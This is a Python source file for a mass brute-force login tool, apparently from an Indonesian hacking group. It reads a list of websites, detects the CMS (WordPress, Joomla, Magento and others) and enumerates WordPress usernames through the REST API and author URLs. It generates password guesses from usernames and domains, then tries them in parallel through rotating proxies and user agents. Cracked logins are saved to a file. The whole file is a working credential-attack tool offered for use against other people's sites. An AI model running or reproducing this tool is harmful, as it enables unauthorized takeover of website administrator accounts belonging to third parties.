#Author : Arex091
#Chanel: https://t.me/GarudaSecID

import requests
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import random
import re
import logging
import time
import os

BLUE = '\033[94m'
UNGU = '\033[35m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

os.system("cls" if os.name == "nt" else "clear") #Arex091-T3GASEC CYBER TEAM

# Inisialisasi colorama dan logging
init(autoreset=True)

# Daftar User-Agent untuk rotasi
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
]

# Memuat proxy dari file
def load_proxies():
    try:
        with open('proxies.txt', 'r') as file:
            proxies = file.read().splitlines()
        return proxies
    except FileNotFoundError:
        return []

PROXIES = load_proxies()

# Fungsi untuk mendapatkan proxy acak
def get_random_proxy():
    if PROXIES:
        return {'http': random.choice(PROXIES), 'https': random.choice(PROXIES)}
    return None
    
# Fungsi untuk mengambil nama domain dari URL
def extract_domain(url):
    domain = re.findall(r'://(www\.)?([^/]+)', url)[0][1]
    return domain

# Fungsi untuk membuat variasi password
def generate_password_variations(username, domain):
    current_year = time.strftime("%Y")
    variations = [
        f"{username}{domain}",          # Misal: adminsynchash
        f"{username}{current_year}",    # Misal: admin2020
        f"{username}{domain}.{current_year}", # Misal: adminsynchash.in
        f"{username}{domain.split('.')[0]}",  # Misal: adminsynchash
        f"{username}123",               # Misal: admin123
        f"{username}_admin123",           # Misal: admin_admin123
        f"{domain}_admin",             # Misal : synchash_admin
        f"{domain}_admin{domain}",        # Misal : synchash_adminsynchash
        f"{domain}_admin123",           # Misal: synchash_admin123
        f"{username}{domain}.{current_year[-2:]}" # Misal: adminsynchash.in20
        f"{username}@{domain}",
        f"{username}#{current_year}",
        f"{username}2024#",
        f"{username}2024@",
        f"{username}admin",
        f"{username}!!!",
        f"{username}$%^&",
    ]
    return variations
    
# Fungsi untuk membuat variasi username
def generate_username_variations(username, domain):
    variations = [
        f"{username}",
        f"{username}_{domain}",
        f"{username}.{domain.split('.')[0]}",
        f"{username}{random.randint(1, 99)}",
        f"{domain.split('.')[0]}_{username}",
        f"{domain}_{username}",
        f"{username}@{domain}",
        f"{username}{domain.split('.')[0]}",
        f"{username}{random.choice(['123', 'admin', 'test', 'user', 'guest'])}",
        f"{username}{domain}",
        f"{username}#{random.randint(1, 99)}",
    ]
    return variations

# Fungsi untuk menyimpan variasi password ke file pass.txt
def save_password_variations(variations):
    try:
        with open('pass.txt', 'a') as file:
            for variation in variations:
                file.write(f"{variation}\n")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] File pass.txt not found. Creating a new file.")
        with open('pass.txt', 'w') as file:
            for variation in variations:
                file.write(f"{variation}\n")

# Deteksi Username dan Auto Generate Password di dalam detect_username()
def detect_username(url):
    usernames = []

    # Coba metode wp-json/wp/v2/users 
    try:
        response = requests.get(urljoin(url, 'wp-json/wp/v2/users'), headers={'User-Agent': random.choice(USER_AGENTS)}, proxies=get_random_proxy(), timeout=5)
        if response.status_code == 200:
            users = response.json()
            for user in users:
                usernames.append(user['slug'])
            if usernames:
                print(f"{Fore.GREEN}[INFO] Username Detect: {usernames}")
                # Auto Generate Password
                domain = extract_domain(url)
                for username in usernames:
                    variations = generate_password_variations(username, domain)
                    save_password_variations(variations)
                return usernames
    except requests.RequestException:
        pass

    # Coba metode ?author=1
    try:
        response = requests.get(urljoin(url, '?author=1'), headers={'User-Agent': random.choice(USER_AGENTS)}, proxies=get_random_proxy(), timeout=5)
        if response.status_code == 200 and 'author/' in response.url:
            parts = response.url.split('author/')
            if len(parts) > 1:  # Pastikan hasil split memiliki dua bagian
                username = parts[1].split('/')[0]
                usernames.append(username)
                print(f"{Fore.GREEN}[INFO] Username Detect: {usernames}")
                # Auto Generate Password
                domain = extract_domain(url)
                variations = generate_password_variations(username, domain)
                save_password_variations(variations)
            return usernames
    except requests.RequestException:
        pass

    # Coba metode /author/
    try:
        response = requests.get(urljoin(url, 'author/'), headers={'User-Agent': random.choice(USER_AGENTS)}, proxies=get_random_proxy(), timeout=5)
        if response.status_code == 200:
            username = response.url.split('author/')[1].split('/')[0]
            usernames.append(username)
            print(f"{Fore.GREEN}[INFO] Username Detect: {usernames}")
            # Auto Generate Password
            domain = extract_domain(url)
            variations = generate_password_variations(username, domain)
            save_password_variations(variations)
            return usernames
    except requests.RequestException:
        pass

# Fungsi untuk mendeteksi CMS berdasarkan pola URL umum
def detect_cms(url):
    cms_login_paths = {
        'wordpress': 'wp-login.php',
        'joomla': 'administrator/index.php',
        'drupal': ':2083',
        'magento': 'admin',
        'cpanel': '2083',
        'prestashop': 'admin1234abc',
        'opencart': 'admin',
        'typo3': 'typo3',
        'concrete5': 'index.php/login',
        'ghost': 'ghost',
        'modx': 'manager',
        'craft': 'admin/login'
    }
    
    for cms, login_path in cms_login_paths.items():
        login_url = urljoin(url, login_path)
        try:
            response = requests.get(login_url, headers={'User-Agent': random.choice(USER_AGENTS)}, proxies=get_random_proxy(), timeout=5)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[INFO] CMS Detect: {cms}. URL Login: {login_url}")
                return cms, login_url
        except requests.RequestException:
            continue
    return None, None

def detect_captcha(response_text):
    # Cek beberapa pola umum CAPTCHA
    if re.search(r'captcha|g-recaptcha|recaptcha', response_text, re.IGNORECASE):
        return True
    return False

# Fungsi untuk mencoba login dengan satu password
def attempt_login(login_url, username, password, cms_type, retry_limit=3):
    for attempt in range(retry_limit):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            proxy = get_random_proxy()
            
            # Sesuaikan payload POST berdasarkan jenis CMS
            if cms_type == 'wordpress':
                data = {'log': username, 'pwd': password}
            elif cms_type == 'joomla':
                data = {'username': username, 'passwd': password, 'task': 'login'}
            elif cms_type == 'drupal':
                data = {'name': username, 'pass': password, 'form_id': 'user_login'}
            elif cms_type == 'magento':
                data = {'login[username]': username, 'login[password]': password}
            elif cms_type == 'prestashop':
                data = {'email': username, 'passwd': password, 'submitLogin': ''}
            elif cms_type == 'opencart':
                data = {'username': username, 'password': password}
            elif cms_type == 'typo3':
                data = {'username': username, 'userident': password}
            elif cms_type == 'concrete5':
                data = {'uName': username, 'uPassword': password}
            elif cms_type == 'ghost':
                data = {'identification': username, 'password': password}
            else:
                print(f"{Fore.RED}[ERROR] CMS {cms_type} tidak dikenal atau belum didukung.")
                return False

            response = requests.post(login_url, data=data, headers=headers, proxies=proxy, timeout=5)
            
# Periksa apakah CAPTCHA terdeteksi
            if detect_captcha(response.text):
                print(f"{Fore.YELLOW}[WARNING] CAPTCHA Detected {login_url}")
                logging.warning(f"Stopping Brute force at {login_url}")
                return False  # Hentikan percobaan brute force jika CAPTCHA ditemukan

            # Periksa status kode atau kondisi lain yang menunjukkan login berhasil
            if 'dashboard' in response.text or response.status_code == 302:
                print(f"{Fore.GREEN}[+] SUCCESSFUL {login_url}")
                logging.info(f"Login berhasil {login_url}#admin@{password}")
                # Simpan hasil ke SUCCESSFUL.txt
                with open('good.txt', 'a') as success_file:
                    success_file.write(f"{login_url}#admin@{password}\n")
                return True
            else:
                print(f"{Fore.RED}[-] FAILED {login_url}")
                return False
        except requests.RequestException as e:
            print(f"{Fore.RED}[ERROR]")
            time.sleep(1)
            continue
    logging.error(f"Failed to try to login to {login_url} after {retry_limit} test .")
    return False

# Fungsi untuk melakukan brute force login dengan threading
def brute_force_login(login_url, username, cms_type, max_attempts=100):
    passwords = []
    try:
        with open('pass.txt', 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] File pass.txt Not Found")
        return

    print(f"{Fore.CYAN}[INFO] Trying to login with user: {username}")

    # Batasi jumlah percobaan brute force
    attempts = 0
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        for password in passwords:
            if attempts >= max_attempts:
                break
            futures[executor.submit(attempt_login, login_url, username, password, cms_type)] = password
            attempts += 1
        for future in futures:
            if future.result():  # Jika login berhasil, hentikan percobaan
                print(f"{Fore.CYAN}[INFO] Password Cracked: {futures[future]}")
                return

    print(f"{Fore.YELLOW}[INFO] FAILED TO BF.")
    logging.info(f"Finished {login_url}.")

# Fungsi untuk membaca URL dari file
def load_urls(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = file.read().splitlines()
        return urls
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] File {file_path} Not Found.")
        return []

# Fungsi utama
def main(): #Fuck Kang recode - Arex091
    print(f"""{UNGU}
╭━━━╮╱╱╭╮╱╱╱╭━━━┳━╮╭━╮╱╱╭╮╱╱╱╭━━┳╮
┃╭━╮┃╱╭╯╰╮╱╱┃╭━━┻╮╰╯╭╯╱╱┃┃╱╱╱╰┫┣╯╰╮   
┃┃╱┃┣╮┣╮╭╋━━┫╰━━╮╰╮╭╯╭━━┫┃╭━━╮┃┣╮╭╯   Author: Arex091 
┃╰━╯┃┃┃┃┃┃╭╮┃╭━━╯╭╯╰╮┃╭╮┃┃┃╭╮┃┃┃┃┃    Team  : T3GASEC CYBER TEAM
┃╭━╮┃╰╯┃╰┫╰╯┃╰━━┳╯╭╮╰┫╰╯┃╰┫╰╯┣┫┣┫╰╮
╰╯╱╰┻━━┻━┻━━┻━━━┻━╯╰━┫╭━┻━┻━━┻━━┻━╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃
{RESET}""")

    # Memuat daftar URL dari file
    file_path = input(f"{UNGU}[-] {RESET}{Style.NORMAL}WEBSITE LIST: {RESET}")
    urls = load_urls(file_path)

    if not urls:
        print(f"{Fore.RED}[ERROR] No URL in the file")
        return

    # Loop melalui setiap URL untuk mendeteksi CMS dan melakukan brute force login
    for url in urls:
        print(f"{Fore.CYAN}[INFO] Processing URL: {url}")

        # Deteksi CMS dan URL login
        cms_type, login_url = detect_cms(url)

        if cms_type and login_url:
            # Deteksi username secara otomatis
            usernames = detect_username(url)
            if not usernames:
                print(f"{Fore.YELLOW}[INFO] Username Not detected, Try username default: 'admin'")
                usernames = ['admin']  # Default username jika tidak ditemukan username

            # Loop melalui setiap username untuk brute force login
            for username in usernames:
                brute_force_login(login_url, username, cms_type)
        else:
            print(f"{Fore.RED}[ERROR] Cannot continue brute force without detected login URL or CMS.")
    
    print(f"{Fore.CYAN}[INFO] Process Completed.")
    
if __name__ == "__main__":
    main()
    
# © Copyright - Arex091
# © Dilarang Me recode ^_^